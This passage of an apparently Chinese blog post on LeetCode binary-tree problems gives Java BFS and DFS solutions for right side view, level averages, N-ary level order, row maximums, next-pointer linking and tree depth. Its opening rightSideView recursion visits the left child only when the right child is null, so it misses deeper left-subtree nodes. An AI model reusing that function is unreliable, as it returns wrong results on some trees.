function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        checkFun(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun</span><span class="params">(TreeNode node , <span class="type">int</span> deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(resList.size() &lt; deep)&#123;</span><br><span class="line">            resList.add(node.val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            checkFun(node.right,deep);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            checkFun(node.left,deep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="637-二叉树的层平均值"><a href="#637-二叉树的层平均值" class="headerlink" title="637. 二叉树的层平均值"></a><a href="https://leetcode.cn/problems/average-of-levels-in-binary-tree/">637. 二叉树的层平均值</a></h2><blockquote>
<p>给定一个非空二叉树的根节点 <code>root</code> , 以数组的形式返回每一层节点的平均值。与实际答案相差 <code>10-5</code> 以内的答案可以被接受</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,9,20,null,null,15,7]</span><br><span class="line">输出：[3.00000,14.50000,11.00000]</span><br><span class="line">解释：第 0 层的平均值为 3,第 1 层的平均值为 14.5,第 2 层的平均值为 11 。</span><br><span class="line">因此返回 [3, 14.5, 11] 。</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="思路：层序遍历"><a href="#思路：层序遍历" class="headerlink" title="思路：层序遍历"></a>思路：层序遍历</h3><p>一开始的递归写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; tempList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;Double&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Double&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Double&gt; <span class="title function_">averageOfLevels</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        checkFun(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span>  <span class="number">0</span> ; i &lt; tempList.size() ; i++)&#123;</span><br><span class="line">            List&lt;Integer&gt; Lists = tempList.get(i);</span><br><span class="line">            <span class="type">Double</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0.0</span> ;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ; j &lt; Lists.size();j++)&#123;</span><br><span class="line">                sum += (<span class="type">double</span>)(Lists.get(j));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Double</span> <span class="variable">ave</span> <span class="operator">=</span> (sum/Lists.size());</span><br><span class="line">            resList.add(ave);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun</span><span class="params">(TreeNode node , <span class="type">int</span> deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(tempList.size() &lt; deep)&#123;</span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            tempList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        tempList.get(deep-<span class="number">1</span>).add(node.val);</span><br><span class="line"></span><br><span class="line">        checkFun(node.left , deep);</span><br><span class="line">        checkFun(node.right , deep);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>迭代写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Double&gt; <span class="title function_">averageOfLevels</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Double&gt; averages = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Double&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span> ;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                sum += node.val;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span>node.left , right = node.right;</span><br><span class="line">                <span class="keyword">if</span>(left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            averages.add(sum/size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> averages;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="429-N-叉树的层序遍历"><a href="#429-N-叉树的层序遍历" class="headerlink" title="429. N 叉树的层序遍历"></a><a href="https://leetcode.cn/problems/n-ary-tree-level-order-traversal/">429. N 叉树的层序遍历</a></h2><blockquote>
<p>给定一个 N 叉树，返回其节点值的<em>层序遍历</em>。（即从左到右，逐层遍历）。</p>
<p>树的序列化输入是用层序遍历，每组子节点都由 null 值分隔（参见示例）</p>
</blockquote>
<p><img src="https://pic.leetcode-cn.com/1646190830-vsGcHq-20220214_214930217_0.jpg"></p>
<h3 id="思路：层序遍历-1"><a href="#思路：层序遍历-1" class="headerlink" title="思路：层序遍历"></a>思路：层序遍历</h3><p>这里用的是迭代的写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">    public int val;</span></span><br><span class="line"><span class="comment">    public List&lt;Node&gt; children;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public Node() &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public Node(int _val, List&lt;Node&gt; _children) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        children = _children;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;Node&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; count ; i++)&#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                item.add(cur.val);</span><br><span class="line">                <span class="keyword">for</span>(Node child : cur.children)&#123;</span><br><span class="line">                    queue.offer(child);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans.add(item);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="515-在每个树行中找最大值"><a href="#515-在每个树行中找最大值" class="headerlink" title="515. 在每个树行中找最大值"></a><a href="https://leetcode.cn/problems/find-largest-value-in-each-tree-row/">515. 在每个树行中找最大值</a></h2><blockquote>
<p>给定一棵二叉树的根节点 root ，请找出该二叉树中每一层的最大值。</p>
<p>示例1：</p>
<p>输入: root &#x3D; [1,3,2,5,3,null,9]<br>输出: [1,3,9]</p>
</blockquote>
<h3 id="思路：广度优先搜索-1"><a href="#思路：广度优先搜索-1" class="headerlink" title="思路：广度优先搜索"></a>思路：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">largestValues</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;TreeNode&gt;();</span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;<span class="comment">//负数也是可以的</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; count ; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll(); </span><br><span class="line">                max = cur.val &gt; max?cur.val :max;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> cur.left , right = cur.right;</span><br><span class="line">                <span class="keyword">if</span>(left != <span class="literal">null</span>)    queue.offer(left);</span><br><span class="line">                <span class="keyword">if</span>(right != <span class="literal">null</span>)   queue.offer(right);</span><br><span class="line">            &#125;</span><br><span class="line">            ans.add(max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="116-填充每个节点的下一个右侧节点指针"><a href="#116-填充每个节点的下一个右侧节点指针" class="headerlink" title="116. 填充每个节点的下一个右侧节点指针"></a><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/">116. 填充每个节点的下一个右侧节点指针</a></h2><blockquote>
<p>给定一个 完美二叉树 ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p>
<p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p>
<p>初始状态下，所有 next 指针都被设置为 NULL。</p>
<p>示例 1：</p>
<p>输入：root &#x3D; [1,2,3,4,5,6,7]<br>输出：[1,#,2,3,#,4,5,6,7,#]<br>解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。序列化的输出按层序遍历排列，同一层节点由 next 指针连接，’#’ 标志着每一层的结束。</p>
</blockquote>
<h3 id="思路：广度优先搜索-2"><a href="#思路：广度优先搜索-2" class="headerlink" title="思路：广度优先搜索"></a>思路：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">    public int val;</span></span><br><span class="line"><span class="comment">    public Node left;</span></span><br><span class="line"><span class="comment">    public Node right;</span></span><br><span class="line"><span class="comment">    public Node next;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public Node() &#123;&#125;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    public Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public Node(int _val, Node _left, Node _right, Node _next) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        left = _left;</span></span><br><span class="line"><span class="comment">        right = _right;</span></span><br><span class="line"><span class="comment">        next = _next;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">connect</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)    <span class="keyword">return</span> root;</span><br><span class="line">        Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;Node&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; count ; i++)&#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(i &lt; count -<span class="number">1</span>)&#123;</span><br><span class="line">                    cur.next = queue.peek();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>)    queue.offer(cur.left);    </span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>)    queue.offer(cur.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></h2><blockquote>
<p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p>说明: 叶子节点是指没有子节点的节点。</p>
</blockquote>
<h3 id="思路1：广度优先搜索"><a href="#思路1：广度优先搜索" class="headerlink" title="思路1：广度优先搜索"></a>思路1：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;TreeNode&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; count ; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(cur.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.offer(cur.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路2：深度优先搜索"><a href="#思路2：深度优先搜索" class="headerlink" title="思路2：深度优先搜索"></a>思路2：深度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> maxDepth(root.left);</span><br><span class="line">            <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> maxDepth(root.right);</span><br><span class="line">            <span class="keyword">return</span> Math.max(leftHeight,rightHeight)+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="111-二叉树的最小深度"><a href="#111-二叉树的最小深度" class="headerlink" title="111. 二叉树的最小深度"></a><a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/">111. 二叉树的最小深度</a></h2><blockquote>
<p>给定一个二叉树，找出其最小深度。</p>
<p>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p>
<p>说明：叶子节点是指没有子节点的节点。</p>
<p>示例 1：</p>
<p>输入：root &#x3D; [3,9,20,null,null,15,7]<br>输出：2</p>
</blockquote>
<h3 id="思路1：广度优先搜索-1"><a href="#思路1：广度优先搜索-1" class="headerlink" title="思路1：广度优先搜索"></a>思路1：广度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">QueueNode</span> &#123;</span><br><span class="line">        TreeNode node;</span><br><span class="line">        <span class="type">int</span> depth;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">QueueNode</span><span class="params">(TreeNode node, <span class="type">int</span> depth)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.node = node;</span><br><span class="line">            <span class="built_in">this</span>.depth = depth;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Queue&lt;QueueNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;QueueNode&gt;();</span><br><span class="line">        queue.offer(<span class="keyword">new</span> <span class="title class_">QueueNode</span>(root, <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">QueueNode</span> <span class="variable">nodeDepth</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> nodeDepth.node;</span><br><span class="line">            <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> nodeDepth.depth;</span><br><span class="line">            <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> depth;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.offer(<span class="keyword">new</span> <span class="title class_">QueueNode</span>(node.left, depth + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.offer(<span class="keyword">new</span> <span class="title class_">QueueNode</span>(node.right, depth + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="思路2：深度优先搜索-1"><a href="#思路2：深度优先搜索-1" class="headerlink" title="思路2：深度优先搜索"></a>思路2：深度优先搜索</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">min_depth</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">if</span> (root.left != <span class="literal">null</span>) &#123;</span><br><span class="line">            min_depth = Math.min(minDepth(root.left), min_depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">            min_depth = Math.min(minDepth(root.right), min_depth);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> min_depth + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="三、翻转二叉树"><a href="#三、翻转二叉树" class="headerlink" title="三、翻转二叉树"></a>三、翻转二叉树</h1><h2 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h2><blockquote>
<p>给你一棵二叉树的根节点 <code>root</code> ，翻转这棵二叉树，并返回其根节点。</p>
<p> <img src="https://assets.leetcode.com/uploads/2021/03/14/invert1-tree.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [4,2,7,1,3,6,9]</span><br><span class="line">输出：[4,7,2,9,6,3,1]</span><br></pre></td></tr></table></figure>
</blockquote>
